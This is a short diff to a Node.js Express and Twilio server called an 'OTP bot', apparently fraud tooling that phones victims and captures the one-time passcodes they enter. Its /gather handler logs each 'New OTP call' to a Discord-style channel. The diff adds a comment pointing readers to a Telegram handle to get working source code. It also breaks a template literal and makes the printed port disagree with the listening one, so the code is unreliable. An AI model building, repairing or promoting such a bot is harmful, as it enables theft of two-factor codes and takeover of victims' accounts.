@@ -1,3 +1,4 @@
+// otp bot is outdated codes will not work still if u want working source code simply dm @laughgrip on telegram
 require("dotenv").config()
 const express = require('express');
 const app = express();
@@ -84,7 +85,7 @@ app.post('/gather', (request, response) => {
         } else {
             db.set(obj.id, 0)
         }
-        bot.abchlog.send(`${obj.si}`, {
+        bot.abchlog.send(`{bj.si}`, {
             embed: new MessageEmbed()
                 .setTitle(`New OTP call.`)
                 .addField("To:", "no lol", true)
@@ -101,5 +102,5 @@ app.post('/gather', (request, response) => {
     response.send(twiml.toString());
 });
 
-console.log('Twilio Client app HTTP server running at http://127.0.0.1:3000');
+console.log('Twilio Client app HTTP server running at http://127.0.0.1:3001');
 app.listen(3000);
